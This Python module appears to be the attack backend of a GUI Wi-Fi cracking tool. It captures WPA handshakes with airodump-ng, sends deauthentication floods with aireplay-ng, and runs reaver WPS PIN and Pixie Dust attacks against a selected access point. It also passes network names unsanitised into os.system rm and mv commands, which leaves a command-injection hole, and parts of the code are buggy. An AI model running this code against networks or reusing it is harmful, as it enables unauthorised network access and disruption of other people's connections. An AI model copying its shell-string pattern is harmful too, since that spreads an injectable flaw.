import tools
import subprocess
import os 
import globs
import random as rd
import time
from tkinter import DISABLED, NORMAL

# some gui operations when attack is launched
def attack_launched(tree, scan_btn, stop_attack_btn):
    scan_btn['state'] = DISABLED
    stop_attack_btn['state'] = NORMAL
    tree.state(("disabled",))
    tree.unbind("<Button-3>")

def stopped_attack(tree, scan_btn, stop_attack_btn, tree_on_right_click):
    tree.state(("!disabled",))
    tree.bind("<Button-3>", tree_on_right_click)
    stop_attack_btn['state'] = DISABLED
    scan_btn['state'] = NORMAL

# Handshake
def try_handshake(root, scan_btn, stop_attack_btn, T, tree, interface, tree_on_right_click, passive=True):

    attack_launched(tree, scan_btn, stop_attack_btn)

    tools.addToolInfo(T, "Executing handshake operation...\n\n")
    monitor_interface = tools.enable_monitor(interface)
    tools.addToolInfo(T, str(interface) + " is now in monitor mode, at " + monitor_interface + "\n\n")

    current_item = tree.item(tree.focus())

    # TODO some bug, will fix later
    if len(current_item['values']) == 0:
        tools.addToolInfo(T, "Please try the attack again, something went wrong\n\n")
        stopped_attack(tree, scan_btn, stop_attack_btn, tree_on_right_click)
        tools.disable_monitor(monitor_interface)
        tools.addToolInfo(T, "Monitor mode disabled for " + str(interface) + "\n\n")
        return 0

    mac, wifi_name, enc, channel = current_item['values'][3], current_item['values'][0], \
                current_item['values'][1], current_item['values'][5] 
    tools.addToolInfo(T, "Trying to capture handshake for " + str(wifi_name) + "...\n")

    # Listen using airodump-ng
    cwd = os.path.dirname(os.path.realpath(__file__)) 
    with open(str(wifi_name)+'_output', 'w') as out_file:
        # remove any old temp files
        try : os.system('rm ' + cwd + "/packets_" + str(wifi_name) + "*") 
        except: print("Nothing important...")

        airodump = subprocess.Popen(('airodump-ng -w packets_' + str(wifi_name) + ' --bssid ' + mac + \
                                    ' -c ' + str(channel) + ' ' + monitor_interface).split(" "), \
                                    stdout=out_file, stderr=subprocess.STDOUT, universal_newlines=True, bufsize=1, cwd=cwd)
    
    captured = False
    while not captured:
        root.update()
        if os.path.exists(cwd+"/" + str(wifi_name) + "_output"):
            with open(str(wifi_name) + "_output", "r") as f: 
                for line in f.readlines():
                    if 'Elapsed' in line: # line where we can see when handshake is captured
                        if 'WPA handshake' in line: # handshake captured
                            airodump.terminate()
                            # rename handshake captured to save it for later
                            os.system('mv ' + cwd + '/packets_' + str(wifi_name) +'-01.cap' + ' captured_'+str(wifi_name))
                            tools.addToolInfo(T, "Successfully captued handshake of " + str(wifi_name) + \
                                " !!!.\nCaptured file available at captured_" + str(wifi_name)+'.cap\n\n') 
                            captured = True
                            globs.stop_attack = False
                            break
                        elif globs.stop_attack: # user clicked stopped attack button
                            globs.stop_attack = False
                            airodump.terminate()
                            tools.addToolInfo(T, "Stopped handshake operation.\n\n")
                            captured = True # not really :)
                            break


        # If not passive (active/just listening), try to de-auth and capture 
        if not passive and not captured:
            tools.addToolInfo(T, "Trying to de-authenticate " + str(wifi_name) + "...\n")
            # de-auth using aireplay
            times = rd.randint(3, 12) # random de-auth packets
            aireplay = subprocess.Popen(('aireplay-ng -0 ' + str(times) + ' -a ' + mac + ' ' + monitor_interface).split(" "), \
                                    stdout=subprocess.PIPE, stderr=subprocess.STDOUT, universal_newlines=True, bufsize=1, cwd=cwd)

            root.update()
            if globs.stop_attack:
                globs.stop_attack = False
                airodump.terminate()
                aireplay.terminate()
                tools.addToolInfo(T, "Stopped handshake operation.\n\n")
                captured = True # not really :)
                break

            aireplay.wait()
            tools.addToolInfo(T, "Sent " + str(times) + " de-atuh packets. Listening, please wait...\n")
            t = rd.randint(2, 6) # sleep some random seconds
            time.sleep(t)

    tools.disable_monitor(monitor_interface)
    tools.addToolInfo(T, "Monitor mode disabled for " + str(interface) + "\n\n")

    stopped_attack(tree, scan_btn, stop_attack_btn, tree_on_right_click)

    return 0

# wps attack (includes pixie dust)
def wps_attack(root, scan_btn, stop_attack_btn, T, tree, interface, tree_on_right_click, pixie = False):

    attack_launched(tree, scan_btn, stop_attack_btn)

    tools.addToolInfo(T, "Executing WPS attack operation...\n\n")
    monitor_interface = tools.enable_monitor(interface)
    tools.addToolInfo(T, str(interface) + " is now in monitor mode, at " + monitor_interface + "\n\n")

    current_item = tree.item(tree.focus())

    # TODO some bug, will fix later
    if len(current_item['values']) == 0:
        tools.addToolInfo(T, "Please try the attack again, something went wrong\n\n")
        stopped_attack(tree, scan_btn, stop_attack_btn, tree_on_right_click)
        tools.disable_monitor(monitor_interface)
        tools.addToolInfo(T, "Monitor mode disabled for " + str(interface) + "\n\n")
        return 0

    mac, wifi_name, enc, channel, wps = current_item['values'][3], current_item['values'][0], \
                current_item['values'][1], current_item['values'][5], current_item['values'][4] 

    if wps == '-' or "(l)" in wps:
        tools.addToolInfo(T, "Please choose a WiFi network with WPS enabled (give the tool its time to get this info) and not locked (nl)\n\n")
        stopped_attack(tree, scan_btn, stop_attack_btn, tree_on_right_click)
        tools.disable_monitor(monitor_interface)
        tools.addToolInfo(T, "Monitor mode disabled for " + str(interface) + "\n\n")
        return 0

    # Execute reaver
    cwd = os.path.dirname(os.path.realpath(__file__)) 
    with open(str(wifi_name)+'_reaver_output', 'w') as out_file:
        pix_arg = ''
        if pixie:
            pix_arg = '-K'
        reaver = subprocess.Popen(('reaver -i'+ monitor_interface + ' --bssid ' + mac + \
                                    ' -c ' + str(channel) + ' ' + pix_arg).split(" "), \
                                    stdout=out_file, stderr=subprocess.STDOUT, universal_newlines=True, bufsize=1, cwd=cwd)

    done = False
    while not done:
        root.update()
        if os.path.exists(cwd+"/" + str(wifi_name) + "_reaver_output"):
            with open(str(wifi_name) + "_reaver_output", "r") as f: 
                for line in f.readlines():
                    print(line)

                    if globs.stop_attack: # clicked stopped attack button
                        globs.stop_attack = False
                        reaver.terminate()
                        tools.addToolInfo(T, "Stopped WPS attack operation.\n\n")
                        done = True 
                        break


    tools.disable_monitor(monitor_interface)
    tools.addToolInfo(T, "Monitor mode disabled for " + str(interface) + "\n\n")

    return 0